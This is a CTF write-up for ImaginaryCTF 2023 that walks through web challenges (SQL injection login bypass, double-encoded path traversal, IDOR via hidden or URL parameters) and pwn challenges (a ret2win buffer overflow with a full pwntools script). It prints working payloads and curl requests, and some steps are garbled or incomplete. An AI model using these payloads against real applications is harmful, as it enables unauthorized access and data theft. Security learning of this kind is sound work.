# Imaginary CTF 2023
My writeup for imaginary CTF 2023. Use as learning process. Focusing more in web and pwn challenge.

## WEB
### Challenge Name
**Description**
I asked ChatGPT to make me a website. It refused to make it vulnerable so I added a little something to make it interesting. I might have forgotten something though...

**Solution**
Below code can be read in `/app.js` where it happen to be SQL Injection in `/login`. To gain /flag we must have access as admin.
```
app.get('/flag', (req, res) => {
  if (req.session.username == "admin") {
    res.send('Welcome admin. The flag is ' + fs.readFileSync('flag.txt', 'utf8'));
  }
  else if (req.session.loggedIn) {
    res.status(401).send('You must be admin to get the flag.');
  } else {
    res.status(401).send('Unauthorized. Please login first.');
  }
});

--snippet--

app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  db.get('SELECT * FROM users WHERE username = "' + username + '" and password = "' + password+ '"', (err, row) => {
    if (err) {
      console.error(err);
      res.status(500).send('Error retrieving user');
```
The sqlinjection might be look like .

```
admin : admin'or1=1
SELECT * FROM users WHERE username = "' admin'" and password = "'admin'or1=1"
```
The above payload are unsuccessfully. 

The application show error when we try to put `"`. We will try to use Error Based Attack to Enumerate Database. Since this website using **sqlite3** version. The payload we look something like `" UNION SELECT 1, "admin", "hello" --`

```
PAYLOAD TESTING
" union select * from sqlite_master /*
Error retrieving user
> SELECTs to the left and right of UNION do not have the same number of result columns

" UNION SELECT 1, "admin", "whyme" --
OR
" union select 1,1,1 from sqlite_master /*
Login Success
```
Request `/flag` to get the flag.


==ictf{sqli_too_powerful_9b36140a}==

---
### ROK
**Description**
My rock enthusiast friend made a website to show off some of his pictures. Could you do something with it?

**Solution**
Given 2 file `/index.php `and `/file.php`. 
```
/index.php
  xhr.open("GET", "file.php?file=" + randomImageName, true);
            xhr.responseType = "blob";
            xhr.send();
        }
        

/file.php
  $filename = urldecode($_GET["file"]);
  if (str_contains($filename, "/") or str_contains($filename, ".")) {
    $contentType = mime_content_type("stopHacking.png");
    header("Content-type: $contentType");
    readfile("stopHacking.png");
  } else {
    $filePath = "images/" . urldecode($filename);
    $contentType = mime_content_type($filePath);
    header("Content-type: $contentType");
    readfile($filePath);
  }
```
Briefyly there was Local File Inclusion or directory traverse in index.php when in get file. But there are some restrition where it will decode the payload and the payload cannot contains `/` or `.`.

To exploit this, we can use double encoding for directory. Since we know the flag at /flag and the site directory at /var/www/html/images. We can craft payload look like `../../../../flag.png`

```
Final Payload
--Double Encode
/file.php?file=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fflag%252Epng

Success on three encoding
/file.php?file=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng
```
==ictf{tr4nsv3rsing Ov3r_rO0k5_6a3367}==

---

### IDORIOT
**Description**
Some idiot made this web site that you can log in to. The idiot even made it in php. I dunno.

**Solution**
This website have function to register but got some vulnerability where we can modify the user id.
```
//registration.php
  <p>The user database will be wiped every 30 minutes.</p>
    <form method="POST" action="register.php">
        <label for="username">Username</label>
        <input type="text" name="username" id="username" required>
        <br>
        <label for="password">Password</label>
        <input type="password" name="password" id="password" required>
        <br>
        <input type="hidden" name="user_id" value="<?= random_int(1, 1000000000) ?>">
        <input type="submit" value="Register">
    </form>
```
```
/index.php
// Get the user for admin
$db = new PDO('sqlite:memory:');
$admin = $db->query('SELECT * FROM users WHERE user_id = 0 LIMIT 1')->fetch();

// Check if the user is admin
if ($admin['user_id'] === $_SESSION['user_id']) {
    // Read the flag from flag.txt
    $flag = file_get_contents('flag.txt');
    echo "<h1>Flag</h1>";
    echo "<p>$flag</p>";
```
Normal `user_id` will be in range `1,1000000000` but what about user 0?.
```
Data send

username=myname&password=name&user_id=188294740
```
![image](https://hackmd.io/_uploads/rytFKP6O0.png)
```
curl -X POST -iL 'http://localhost:8081/register.php'  'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=hacker&password=hacker1&user_id=0'
```
![image](https://hackmd.io/_uploads/HJNh5P6OR.png)


==ictf{1ns3cure_direct_object_reference_from_hidden_post_param_i_guess}==

---
### Idoriot-Revenge
**Description**
The idiot who made it, made it so bad that the first version was super easy. It was changed to fix it.
**Solution**
```
if ($user && password_verify($password, $user['password'])) {
        // Login successful
        // Store user ID in session
        $_SESSION['user_id'] = (int) $user['user_id'];
        $_SESSION['username'] = $user['username'];

        // Redirect to landing page, pass user ID in URL
        header("Location: index.php" . "?user_id=" . urlencode($user['user_id']));
        exit;
        
if ($user_id == "php" && preg_match("/".$admin['username']."/", $_SESSION['username'])) {
        // Read the flag from flag.txt
        $flag = file_get_contents('/flag.txt');
        echo "<h1>Flag</h1>";
        echo "<p>$flag</p>";
    }
        
```
This time they fix the data being stored in Database by passing the userID. We cannot manipulate userid anymore. But there are new vulnerability in URL directory where it passed the `user_id` which we can manipulate it in endpoint `/index.php`.

Next it also check the username is `admin`. As long as the word admin appear in username, it will triggered it as admin. 

The payload will look like
```
Register with any user
myadmin:hello

curl -X POST -iL 'http://localhost:8081/register.php'  'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=aaddmmiin&password=hello

/login.php?user_id=php

```

==ictf{this_ch4lleng3_creator_1s_really_an_idoriot}==

---


## PWN
### Ret2Win
**Description**
Can you overflow the buffer and get the flag? (Hint: if your exploit isn't working on the remote server, look into stack alignment)
**Solution**
```
int main() {
  char buf[64];
  gets(buf);
}

int win() {
  system("cat flag.txt");
}

```
Obvious buffer overflow where in `/main` the `buf` directly being called without any buffer. We can put more than `64` to overflow it. Then overwrite return from end the program to call win `function`. 

```
set disassembly-flavor intel
set pagination off
Find the overflow
cyclic 100
*RBP  0x6161616161616169 ('iaaaaaaa') # offset 64

Return padding 1 byte = 8bits

(rop.find_gadget(['ret'])[0])
ropper -f vuln --search "ret"

x win
```


```
from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./vuln", )
elf = context.binary = ELF("./vuln", checksec=False)
rop = ROP(elf)
context.log_level = 'debug'

payload=b'A'*64 
payload += b'B'*8
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(elf.sym.win)

io.sendline(payload)
print(io.recvall().decode())

```

==ictf{r3turn_0f_th3_k1ng?}==

---

### Ret2Lose
**Description**
You overflowed the buffer and got the flag... but can you get my other flag? (Remote and binary are the same as in the challenge `ret2win`)

**Solution**
```
int main() {
  char buf[64];
  gets(buf);
}

int win() {
  system("cat flag.txt");
}

```
Using the file but this time to get shell in host machine. It can be done if we have libc unfortunately, there are nothing. Another way to exploit it by using get@plt since it will call function in libc. By manipulate this, we can put our shell on it.

```
Offset 64
padding 8

use plt@get to retreive system.
elf.plt.gets
elf.plt.system

send /bin0sh\x00
```

==ictf{ret2libc?_what_libc?}==

---



## PWN
### Ret2Win
**Description**

**Solution**
```
Code here
```

==Flag==

---



## Resources Tools
